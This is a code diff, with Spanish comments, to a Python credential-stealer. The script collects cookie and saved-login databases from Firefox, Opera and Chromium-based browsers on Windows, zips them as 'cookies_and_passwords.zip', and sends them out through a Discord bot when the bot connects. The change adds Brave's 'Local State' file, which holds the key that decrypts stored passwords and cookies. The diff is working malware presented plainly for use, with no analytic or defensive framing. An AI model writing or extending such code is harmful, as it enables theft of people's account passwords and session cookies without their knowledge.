@@ -23,13 +23,14 @@ def get_browser_data_paths():
         "firefox_cookies": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
         "firefox_logins": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
         "opera_cookies": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable", "Cookies"),
+        "brave_local_state": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
     }
 
     detected_paths = {name: path for name, path in paths.items() if os.path.exists(path)}
-    return detected_paths
+    return detected_paths, user_path  # Devolvemos también user_path
 
 # Función para copiar los archivos directamente a un ZIP
-def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
+def create_zip_file(data_paths, user_path, zip_name="cookies_and_passwords.zip"):
     with zipfile.ZipFile(zip_name, 'w') as zipf:
         for name, path in data_paths.items():
             if name == "firefox_cookies" or name == "firefox_logins":
@@ -43,6 +44,12 @@ def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
                         zipf.write(path_cookies, "firefox_cookies.sqlite")
                     if os.path.exists(path_logins):
                         zipf.write(path_logins, "firefox_logins.json")
+            elif name == "brave_local_state":
+                # Crear la estructura de carpetas y agregar 'Local State' de Brave
+                local_state_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+                if os.path.exists(path):
+                    # Creamos la estructura de carpetas en el zip
+                    zipf.write(path, "Google/Chrome/User Data/Local State")
             else:
                 # Copiar cookies tal como están y renombrar Login Data como .sqlite
                 if os.path.exists(path):
@@ -64,13 +71,13 @@ async def on_ready():
     print(f"{bot.user.name} está conectado a Discord.")
 
     # Detectar los navegadores y crear el archivo ZIP con cookies y contraseñas
-    data_paths = get_browser_data_paths()
+    data_paths, user_path = get_browser_data_paths()  # También obtenemos user_path
     if not data_paths:
         print("No se detectaron navegadores con cookies o contraseñas almacenadas.")
         return
 
     # Crear archivo ZIP
-    zip_path = create_zip_file(data_paths)
+    zip_path = create_zip_file(data_paths, user_path)
 
     # Acceder al canal
     guild = discord.utils.get(bot.guilds, id=GUILD_ID)
